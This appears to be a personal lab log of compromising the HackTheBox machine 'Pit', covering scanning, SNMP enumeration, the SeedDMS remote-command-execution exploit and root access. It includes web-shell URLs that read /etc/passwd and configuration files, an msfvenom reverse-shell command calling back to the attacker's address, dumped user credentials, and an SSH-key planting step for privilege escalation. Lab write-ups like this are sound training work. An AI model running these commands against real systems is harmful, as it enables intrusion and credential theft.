
```
02Feb2023
Exploit used: 
	- https://www.exploit-db.com/exploits/47022
	- # SeedDMS versions < 5.1.11 - Remote Command Execution

Privilege escalation used: 
	- 
Lessons learned:
- always run udp nmap as well..
- snmpwalk - notes listed under syntax
- must add ip addresses to /etc/hosts file always, was only able to access this webpage by using the host name and directory found during the snmp walk
-PHP web shell commands.
	- http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=ls%20-la
	- http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=ls%20-la%20../../
	- http://dms-pit.htb/seeddms51x/data/1048576/33/1.php?cmd=cat%20/etc/passwd
	-http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=cat%20../../../conf/settings.xml
		- used above command to look at configuration settings in burpsuite and dumped a password, walkthrough says the password is for michelle on port 9090.
- HAD TO USE IN BURPSUITE IN ORDER TO PROPERLY USE THE WEBSHELL FOR COMMAND EXECUTION
- getfacl when a + is in ls -la, this shows direct user permissions which could be write/execute.


Loot:
[michelle@pit ~]$ cat user.txt
8bb613fb59a3890b58806bcc4cf0d12a

29 root.txt.png
```

```
14:50
┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.10.10.241
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 19:50 EST

┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.10.10.241
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 19:50 EST
Nmap scan report for 10.10.10.241
Host is up (0.14s latency).
Not shown: 994 filtered tcp ports (no-response), 3 filtered tcp ports (admin-prohibited)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6fc3408f6950695a57d79c4e7b1b9496 (RSA)
|   256 c26ff8aba12083d160abcf632dc865b7 (ECDSA)
|_  256 6b656ca692e5cc76175a2f9ae750c350 (ED25519)
80/tcp   open  http            nginx 1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
|_http-server-header: nginx/1.14.1
9090/tcp open  ssl/zeus-admin?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.93%T=SSL%I=7%D=2/2%Time=63DC5AB5%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,E70,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:\
SF:x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DNS
SF:-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Conte
SF:nt-Type-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-or
SF:igin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20\x20<
SF:title>\r\nb\r\nBad\x20request\r\nd08\r\n</title>\n\x20\x20\x20\x20<meta
SF:\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=utf-
SF:8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<style>\n\tbody\x2
SF:0{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDis
SF:play\",\x20\"Open\x20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.66666667
SF:;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f
SF:5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x
SF:200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x
SF:20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-we
SF:ight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20marg
SF:in:\x200\x200\x2010p")%r(HTTPOptions,E70,"HTTP/1\.1\x20400\x20Bad\x20re
SF:quest\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransfer-Encodi
SF:ng:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x2
SF:0no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\nCross-Origin-Reso
SF:urce-Policy:\x20same-origin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<h
SF:ead>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title>
SF:\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"tex
SF:t/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"
SF:\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x2
SF:0\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font
SF:-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20Ar
SF:ial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fo
SF:nt-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line
SF:-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20margin:\x200\x200\x2010p");
```

```
14:59
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.241 -k -x txt,php,html -t 250

┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.241 -k -x txt,php,html -t 250
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.241
[+] Method:                  GET
[+] Threads:                 250
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/02/02 20:07:41 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4057]
/404.html             (Status: 200) [Size: 3971]

```

```
15:01
dirsearch -u http://10.10.10.241:80 -x 400,401,403

```

```
15:03
- browsing to website http://10.10.10.241:80 while waiting for web fuzzer results.
	- image 2
- found version on webpage - red hat enterprise linux 9
	- image 2.5

```

```
15:09
┌──(root㉿kali)-[/home/kali]
└─# searchsploit redhat 9.0
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
hztty 2.0 (RedHat 9.0) - Local Privilege Escalation                                | linux/local/104.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) | linux/local/9479.c
RedHat 9.0 / Slackware 8.1 - '/bin/mail' Carbon Copy Field Buffer Overrun          | linux/local/22695.pl
XGalaga 2.0.34 (RedHat 9.0) - Local Game                                           | linux/local/71.c
xtokkaetama 1.0b (RedHat 9.0) - Local Game                                         | linux/local/72.c
----------------------------------------------------------------------------------- ---------------------------------

	- looking into hztty 2.0 local priv esc
	- local priv esc, not initial access.
```

```
15:18
looking for nginx 1.14.1 exploit
	- nothing found, can come back if still stuck.
```

```
15:26
9090/tcp open  ssl/zeus-admin?
	- looking up exploits for this.
		- looking on website
	- browsed to http://10.10.10.241:9090
	- image 4
	- tried creds:
		- admin:admin
		- root:root
		- admin:(blank) - default creds
		- admin:
```


```
15:31
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/pit]
└─# searchsploit zeus    
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Zeus Web Server 3.x - Null Terminated Strings                                      | cgi/remote/19747.txt
Zeus Web Server 4.0/4.1 - Admin Interface Cross-Site Scripting                     | cgi/remote/22000.txt
Zeus Web Server 4.x - 'SSL2_CLIENT_HELLO' Remote Buffer Overflow (PoC)             | multiple/dos/33531.py
Zeus Web Server 4.x - Admin Interface 'VS_Diag.cgi' Cross-Site Scripting           | cgi/webapps/22692.txt
ZeusCart - 'prodid' SQL Injection                                                  | php/webapps/39223.txt
ZeusCart 2.0 - 'category_list.php' SQL Injection                                   | php/webapps/5594.txt
ZeusCart 2.3 - 'maincatid' SQL Injection                                           | php/webapps/8829.pl
ZeusCart 4.0 - Cross-Site Request Forgery                                          | php/webapps/38223.txt
ZeusCart 4.0 - Cross-Site Request Forgery (Deactivate Customer Accounts)           | php/webapps/46027.html
Zeuscart 4.0 - Multiple Vulnerabilities                                            | php/webapps/36159.txt
ZeusCart 4.0 - SQL Injection                                                       | php/webapps/38224.txt
ZeusCMS 0.2 - Database Backup Dump / Local File Inclusion                          | php/webapps/11437.txt
ZeusCMS 0.3 - Blind SQL Injection                                                  | php/webapps/4798.php
```

```
15:50
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/pit]
└─# nmap -sU --top-ports 10 -sV 10.10.10.241
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 20:49 EST
Nmap scan report for 10.10.10.241
Host is up (0.17s latency).

PORT     STATE    SERVICE      VERSION
53/udp   filtered domain
67/udp   filtered dhcps
123/udp  filtered ntp
135/udp  filtered msrpc
137/udp  filtered netbios-ns
138/udp  filtered netbios-dgm
161/udp  open     snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
445/udp  filtered microsoft-ds
631/udp  filtered ipp
1434/udp filtered ms-sql-m
Service Info: Host: pit.htb
```

```
15:58 - 16:44 break 
- conducted snmpwalk scan while breaking.
- relevant info from snmp walk below

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/pit]
└─# snmpwalk -v1 -c public 10.10.10.241 . > snmpwalk-full

System release info
CentOS Linux release 8.3.2011

SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *


information found:
- CentOS Linux release 8.3.2011
- user michelle, and root.
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
iso.3.6.1.4.1.2021.9.1.3.1 = STRING: "/dev/mapper/cl-root"
iso.3.6.1.4.1.2021.9.1.3.2 = STRING: "/dev/mapper/cl-seeddms"
iso.3.6.1.2.1.25.4.2.1.4.1 = STRING: "/usr/lib/systemd/systemd"
iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmp.local.conf)"
iso.3.6.1.2.1.1.5.0 = STRING: "pit.htb"
```

```
16:54
- navigating to webservers where directories were found

http://10.10.10.241/var/www/html/seeddms51x/seeddms - nope
http://10.10.10.241/seeddms51x/seeddms/ - nope
http://10.10.10.241/dev/mapper/cl-seeddms - nope
http://10.10.10.241/dev/mapper/cl-root - nope
http://pit.htb/usr/lib/systemd/systemd - nope
http://dms-pit.htb/seeddms51x/seeddms/ - yes it worked!
```

```
17:13
***
must add ip addresses to /etc/hosts file always, was only able to access this webpage by using the host name and directory found during the snmp walk
***
- image 8.
```


![[8 `etc hosts dms-pit.png]]

```
17:18
- brute forced login page with credentials michelle:michelle
- looking around website
	- found upgrade note from administrator: image 10
"Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15. See the attached CHANGELOG file for more information. If you find any issues, please report them immediately to admin@dms-pit.htb."
	- found additional user jack
```

```
17:22
- looking into seedDMS 5.1.15 exploits
	- - # SeedDMS versions < 5.1.11 - Remote Command Execution
- changelog.txt shown on website for 5.1.15 version

 --------------------------------------------------------------------------------
                     Changes in version 5.1.15
--------------------------------------------------------------------------------
- Improved import from file system
- HTTP Proxy for access on external extension repository can be set
- Do not use unzip in ExtensionMgr anymore
- fix version compare on info page
- allow one page mode on search page
- fix import of older extension versions from repository
```

```
18:00
- was able to upload cmd injection using michelle's privileges into her own folder as seen in image 14.
- once the file was uploaded followed the exploit and got the document id out of the url to conduct command injection
	- # SeedDMS versions < 5.1.11 - Remote Command Execution
- command used in url: 
	- http://dms-pit.htb/seeddms51x/data/1048576/31/1.php?cmd=ls%20-la

- initially tried to upload a reverse php shell but was unable to execute it. 
	- msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f raw > shell.php
```

```
18:07
- file that allows command injection gets deleted every 5 minutes, this is annoying.
	- - reference image 16
- and the command document id incremenets +1 everytime.
```

```
- http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=ls%20-la
- http://dms-pit.htb/seeddms51x/data/1048576/32/1.php?cmd=ls%20-la%20../../
- http://dms-pit.htb/seeddms51x/data/1048576/33/1.php?cmd=cat%20/etc/passwd
- http://dms-pit.htb/seeddms51x/data/1048576/35/1.php?cmd=cat%20../../../conf/settings.xml
	- used above command to look at configuration settings in burpsuite and dumped a password, walkthrough says the password is for michelle on port 9090.
	- HAD TO USE IN BURPSUITE.
- REFERENCE IMAGES 17 - 21
```



![[21 burpsuite dbpass xml.png]]



```
18:41
*** Stopping here for now, going to update lessons learned and notes before I burn out. Picking up where I left off 03FEB2023 ***

- Creds
- michelle:ied^ieY6xoquu
```

```
16:06
- starting new day.
- logged into http://10.10.10.241:9090 with creds above.
```

```
16:09
got user.txt from built in centOS terminal.
```

```
FOLLOWING IPPSEC VIDEO FROM NOW ON, THIS BOX IS WAY TOO HARD AND OUT OF SCOPE FOR OSCP
```


```
16:49
- identified usr/bin/monitor in smnmp walk
- looking at file
[michelle@pit bin]$ cat monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

```
16:52
echo 'echo Please Subscribe' > usr/local/monitoring/check1.sh
	checking to see if please subsribe gets shown in the snmp walk
```

```
17:24
once ippsec sees that please subscribe came back in the snmp walk he uses image 28 to aapend >> his ssh-rsa keys into the root/.ssh/authorized_keys and > into /usr/local/monitoring/check1.sh
- this allows him to ssh in as root.
```

![[27  echo auth keys priv esc.png]]


```
17:28
ippsec reruns snmpwalk to execute the command, once finished he attempts to ssh and gets root.
```


![[28 rooted.png]]


![[29 root.txt.png]]



```
not the end of the box, but got all the flags, not going further - way too difficult for my level.
```